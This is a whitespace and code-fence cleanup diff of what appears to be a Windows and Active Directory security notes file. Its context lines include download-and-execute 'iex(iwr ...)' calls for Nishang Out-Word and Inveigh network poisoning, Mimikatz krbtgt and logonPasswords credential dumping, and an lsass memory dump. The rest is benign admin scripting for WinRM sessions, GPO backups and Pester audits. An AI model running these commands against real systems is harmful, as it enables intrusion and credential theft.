@@ -70,7 +70,7 @@ function Get-PrivateProfileString
     )
     $builder = [System.Text.StringBuilder]::new(1024)
     $result = [Win32Utils.INIFile]::GetPrivateProfileString($category, $key, "", $builder, $builder.Capacity, $file)
-    return $builder.ToString() 
+    return $builder.ToString()
 }
 
 # Call the function
@@ -106,7 +106,7 @@ End Sub
 ```powershell
 # Import the Out-Word cmdlet from the Nishang module
 iex(iwr 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
- 
+
 # Create payload
 $payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
 
@@ -284,7 +284,7 @@ Invoke-Mimikatz -Command 'sekurlsa::krbtgt' -ComputerName PC2
 Get-Process -Name lsass | Out-Minidump -DumpFilePath .
 ```
 
-```cmd
+```batchfile
 mimikatz.exe "sekurlsa::minidump lsass_560.dmp" sekurlsa::logonPasswords quit
 ```
 
@@ -350,7 +350,7 @@ Find-ProcessDLLHijack
 ```powershell
 iex(iwr 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')
 
-Invoke-Inveigh -LLMNR Y -HTTP Y -SMB Y -NBNS Y -StatusOutput Y -ConsoleOutput Y 
+Invoke-Inveigh -LLMNR Y -HTTP Y -SMB Y -NBNS Y -StatusOutput Y -ConsoleOutput Y
 
 Stop-Inveigh
 ```
@@ -508,7 +508,7 @@ class RemoteShellInfo
             'http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CustomShell' { $result = [ShellType]::CustomShell }
             'http://schemas.microsoft.com/powershell/microsoft.windows.servermanagerworkflows' { $result = [ShellType]::ServerManagerWorkflows }
         }
-        
+
         return $result
     }
 
@@ -533,10 +533,10 @@ function Get-ShellSession
         [ValidateNotNull()]
         [Alias('Computer', 'Server', 'cn', 's', 'c')]
         [string[]] $ComputerName = @('localhost'),
-        
+
         [Alias('UseTLS')]
         [switch] $UseSSL,
-        
+
         [ValidateNotNull()]
         [Nullable[uint16]] $Port
     )
@@ -577,13 +577,13 @@ function Get-ShellSession
                             CompressionMode = $PSItem.CompressionMode
                             InputStreams = $PSItem.InputStreams
                             OutputStreams = $PSItem.OutputStreams
-                            MaxIdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.MaxIdleTimeOut 
-                            IdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.IdleTimeOut 
+                            MaxIdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.MaxIdleTimeOut
+                            IdleTimeOut = ConvertFrom-XmlDuration -Duration $PSItem.IdleTimeOut
                             ProfileLoaded = $PSItem.ProfileLoaded -eq 'Yes'
                             Encoding = $PSItem.Encoding
                             BufferMode = $PSItem.BufferMode
                             State = $PSItem.State
-                            ShellInactivity = ConvertFrom-XmlDuration -Duration $PSItem.ShellInactivity 
+                            ShellInactivity = ConvertFrom-XmlDuration -Duration $PSItem.ShellInactivity
                             ShellRunTime = ConvertFrom-XmlDuration -Duration $PSItem.ShellRunTime
                             ProcessId = $PSItem.ProcessId
                             ChildProcesses = $PSItem.ChildProcesses
@@ -621,13 +621,13 @@ function Remove-ShellSession
         [ValidateNotNullOrEmpty()]
         [Alias('Computer', 'Server', 'cn', 's', 'c')]
         [string] $ComputerName = 'localhost',
-        
+
         [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'ByInputObject')]
         [RemoteShellInfo] $InputObject,
-        
+
         [Alias('UseTLS')]
         [switch] $UseSSL,
-        
+
         [ValidateNotNull()]
         [Nullable[uint16]] $Port
     )
@@ -655,7 +655,7 @@ function Remove-ShellSession
                 'ByShellId' {
                     Remove-WSManInstance -ComputerName $ComputerName -UseSSL:$UseSSL -Port $Port -ResourceURI shell -SelectorSet @{ ShellID = $RemoteShellId } -ErrorAction Stop
                 }
-    
+
                 'ByInputObject' {
                     Remove-WSManInstance -ComputerName $InputObject.ComputerName -UseSSL:$UseSSL -Port $Port -ResourceURI shell -SelectorSet @{ ShellID = $InputObject.RemoteShellId } -ErrorAction Stop
                 }
@@ -696,7 +696,7 @@ function ConvertFrom-XmlDuration
         [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
         [string] $Duration
     )
-    
+
     Process
     {
         try
@@ -707,7 +707,7 @@ function ConvertFrom-XmlDuration
             }
             else
             {
-                return [System.Xml.XmlConvert]::ToTimeSpan($Duration)    
+                return [System.Xml.XmlConvert]::ToTimeSpan($Duration)
             }
         }
         catch [System.FormatException]
@@ -743,7 +743,7 @@ Get-AuthenticodeSignature -FilePath script.ps1
 
 ### Run as&nbsp;Administrator
 
-```cmd
+```batchfile
 @ECHO OFF
 REM Runs the PowerShell script that has the same name as this batch file.
 powershell.exe -ExecutionPolicy Bypass -NoProfile -NoLogo -File "%~dpn0.ps1"
@@ -776,7 +776,7 @@ New-Item -ItemType Directory -Path $backupPath -Force | Out-Null
 Backup-GPO -Path $backupPath -All | Out-Null
 ```
 
-```cmd
+```batchfile
 %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Scripts\Invoke-GPOBackup.ps1
 ```
 
@@ -822,7 +822,7 @@ Unregister-ScheduledTask -TaskName 'Backup All GPOs' -Confirm:$false -Verbose
 ```
 #### Managed Service Accounts
 
-```cmd
+```batchfile
 PsExec.exe -i -u svc_ad_audit$ -p ~ powershell.exe
 ```
 
@@ -1103,7 +1103,7 @@ Describe 'Group Membership' {
         It 'The "<Group>" group should be empty' -TestCases $groups {
             param([string] $Group)
 
-            Get-ADGroupMember -Identity $Group -ErrorAction Stop | 
+            Get-ADGroupMember -Identity $Group -ErrorAction Stop |
                 Should -HaveCount 0
         }
     }
@@ -1157,7 +1157,7 @@ $(document).ready(function() {
 $resultsFile = Join-Path -Path $PSScriptRoot -ChildPath 'results.html'
 
 Invoke-Pester -Path $PSScriptRoot -PassThru |
-    Select-Object -ExpandProperty Tests | 
+    Select-Object -ExpandProperty Tests |
     Select-Object -Property @{ n = 'Category'; e = { $PSItem.Path[0] }},
                             @{ n = 'Context';  e = { $PSItem.Path[1] }},
                             ExpandedName,
